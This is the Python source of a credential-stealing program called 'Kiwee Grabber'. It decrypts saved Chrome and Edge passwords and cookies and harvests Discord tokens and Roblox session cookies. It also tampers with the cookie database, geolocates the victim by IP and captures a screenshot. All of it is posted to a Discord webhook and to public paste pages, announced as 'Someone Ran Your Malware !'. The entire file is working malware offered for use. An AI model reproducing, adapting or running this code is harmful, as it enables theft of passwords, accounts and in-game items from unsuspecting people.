import os,json,base64,shutil,requests,re
from Cryptodome.Cipher import AES
from sqlite3 import connect
from win32crypt import CryptUnprotectData
from discord_webhook import DiscordWebhook,DiscordEmbed
from time import sleep
from urllib.request import Request, urlopen
from winreg import HKEY_CURRENT_USER, OpenKey, EnumValue
from PIL import ImageGrab

class Password:
    def __init__(self):
        self.dataz = "=== Kiwee Grabber ==="
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            key = self.get_encryption_key(local_state_path)
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
            filename = "\\ChromeData.db"
            shutil.copyfile(db_path, appdata+filename)
            db = connect(appdata+filename)
            cursor = db.cursor()
            cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = self.decrypt_password(row[3], key)
                self.dcreate = row[4]
                self.dlu = row[5]        
                if username or password:
                    self.dataz += f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\nGOOGLE CHROME\n"
                else:
                    continue
                self.dataz+="="*50
            cursor.close()
            db.close()
        except:self.dataz +="\nNo Password Found For Google Chrome\n"
        try:
            os.remove(filename)
        except:
            pass
        self.edge_passwords()
    def get_encryption_key(self,local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_password(self,password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
    def decrypt_payload2(self,cipher, payload):
        return cipher.decrypt(payload)
    def generate_cipher2(self,aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    def decrypt_password2(self,buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher2(master_key, iv)
            decrypted_pass = self.decrypt_payload2(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:pass
    def edge_passwords(self):
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data","Local State")
            key = self.get_encryption_key(local_state_path)
            login_db = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
            shutil.copy2(login_db, appdata+"\\Loginvault.db")
            conn = connect(appdata+"\\Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_password(encrypted_password, key)
                    try:
                        self.dataz += f"\nOrigin URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\nMICROSOFT EDGE\n"
                    except:pass
                    self.dataz+="="*50
                self.dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
                self.dataz+="="*50
            except:pass
        except:self.dataz+="\nNo Password Found For Edge"
        r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = self.dataz)
        key = r.json()['key']
        self.site = "https://www.toptal.com/developers/hastebin/"+key
        
    def __repr__(self):
        return self.site
class Cookie:
    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_data(self,data, key):
        try:
            iv = data[3:15]
            data = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(data)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(data, None, None, None, 0)[1])
            except:
                return ""
    def __init__(self):
        self.robloxcookies = []
        dataz = "=== Kiwee Grabber ==="
        try:
            appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
            filename = "\\Cookies.db"
            if not os.path.isfile(appdata+filename):
                shutil.copyfile(db_path, appdata+filename)
            db = connect(appdata+filename)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()
            cursor.execute("""
            SELECT host_key, name, value, encrypted_value
            FROM cookies""")
            key = self.get_encryption_key()
            for host_key, name, value, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = self.decrypt_data(encrypted_value, key)
                else:
                    decrypted_value = value
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_value:
                    self.robloxcookies.append(decrypted_value)
                else:
                    dataz += f"\nHost: {host_key}\nCookie Name: {name}\nValue: {decrypted_value}\n"
                cursor.execute("""
                UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
                WHERE host_key = ?
                AND name = ?""", (decrypted_value, host_key, name))
            db.commit()
            db.close()
            dataz+="="*50
            dataz+='\nGrabbed With Kiwee Grabber, by : vesper\n'
            dataz+="="*50
        except:dataz += "\nNo Cookies Found"
        r = requests.post('https://www.toptal.com/developers/hastebin/documents',data = dataz)
        key = r.json()['key']
        self.site = "https://www.toptal.com/developers/hastebin/"+key
        cnt = 0
        for i in self.robloxcookies:
            cnt +=1
        if cnt == 0:
            pass
        else:
            with open(appdata+'\\roblox_cookiesc.txt', 'w') as f:
                for i in self.robloxcookies:
                    f.write(i+"\n")
                    f.write('=')
                    f.write('\n')
                f.close()
    def __repr__(self):
        return self.site
class DiscordTokenGrab:
    def __init__(self):
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.main()
    def scrapeTokens(self,path):
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens
    def main(self):
        def getheaders(token=None, content_type="application/json"):
            headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
            }
            if token:
                headers.update({"Authorization": token})
            return headers
        def getavatar(uid, aid):
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
            try:
                urlopen(Request(url))
            except:
                url = url[:-4]
            return url
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            tokens = self.scrapeTokens(path)
            if len(tokens) > 0:
                for token in tokens:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                    if r.status_code == 200:
                        j = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)).json()
                        sleep(0.2)
                        user = j["username"] + "#" + str(j["discriminator"])
                        user_id = j["id"]
                        avatar_id = j["avatar"]
                        avatar_url2 = getavatar(user_id, avatar_id)
                        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
                        embed = DiscordEmbed(title=f"Discord", description=f"Found Discord Token", color='299D00')
                        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png')
                        embed.set_footer(text='Kiwee Grabber || vesper#0003 (c)')
                        embed.set_timestamp()
                        embed.add_embed_field(name="Username :", value=f"```{user}```", ineline=False)
                        embed.add_embed_field(name="Token :", value=f"```{token}```", ineline=False)
                        embed.set_thumbnail(url=avatar_url2)
                        webhook.add_embed(embed)
                        response = webhook.execute()
def desktopscreen():
    try:
        screeny = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        screeny.save("testy.jpg")
        screeny.close()
        webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
        with open('testy.jpg', 'rb') as f:
            webhook.add_file(file=f.read(), filename='testy.jpg')
        response = webhook.execute()
        os.remove('testy.jpg')
    except:pass
def roblox_studio_cookie():
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                return value
            count = count + 1
    except WindowsError:
        pass
def roblox_info(cookie):
    global webhookw
    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
        if len(cookie) >= 600:
            webhook = DiscordWebhook(url=webhookw, username="Kiwee", avatar_url=r"https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png")
            embed = DiscordEmbed(title=f"Roblox", description=f"Found Roblox Cookie", color='299D00')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png')
            embed.set_footer(text='Kiwee Grabber || vesper#0003 (c)')
            embed.set_timestamp()
            embed.add_embed_field(name="Cookie :", value=f"```{cookie}```", ineline=False)
            webhook.add_embed(embed)
            response = webhook.execute()
def loc():
    data = requests.get("http://ipinfo.io/json").json()
    try:
        ip = data['ip']
    except:ip = None
    try:
        city = data['city']
    except:city = None
    try:
        country = data['country']
    except:country = None
    try:
        region = data['region']
    except:region = None
    return ip, city, country, region
def grabba():
    global webhookw
    try:
        cookie = str(roblox_studio_cookie())
        rcookie = cookie.split("COOK::<")[1].split(">")[0]
    except:rcookie = "rawr"
    appdata = os.path.join(os.environ["USERPROFILE"], "AppData")
    password_site = Password()
    cookie_site = Cookie()
    ip,city,country,region = loc()
    main_info = {
  "username":"Kiwee",
  'avatar_url': 'https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png',
  "content": '@everyone',
  "embeds": [
    {
      "title": "New Hit",
      "description": "Someone Ran Your Malware !",
      "color": 3195668,
      "fields": [
        {
          "name": "Location",
          "value": f"```\nIP : {ip}\nCountry : {country}\nRegion : {region}\nCity : {city}\n```"
        },
        {
          "name": "Password",
          "value": f"Passwords : **{password_site}**"
        },
        {
          "name": "Cookie",
          "value": f"Cookies : **{cookie_site}**"
        }
      ],
      "author": {
        "name": "author : vesper",
        "icon_url": "https://cdn.discordapp.com/attachments/954181734314942504/967883618452144188/kiwee-removebg-preview.png"
      }
    }
  ],
  "attachments": []
}
    requests.post(webhookw, json=main_info)
    sleep(0.4)
    DiscordTokenGrab() # Get discord tokens
    # look for roblox cookies
    sleep(0.3)
    if os.path.exists(appdata+"\\roblox_cookiesc.txt"):
        roblox_cookie = open(appdata+'\\roblox_cookiesc.txt','r')
        rcontent = roblox_cookie.read()
        new = rcontent.replace('\n','').split('=')
        for i in new:
            roblox_info(i)
        roblox_cookie.close()
        os.remove(appdata+"\\roblox_cookiesc.txt")
    sleep(0.2)
    if rcookie != 'rawr':
        roblox_info(rcookie)
    sleep(0.3)
    #grab screenshot
    desktopscreen()
grabba()
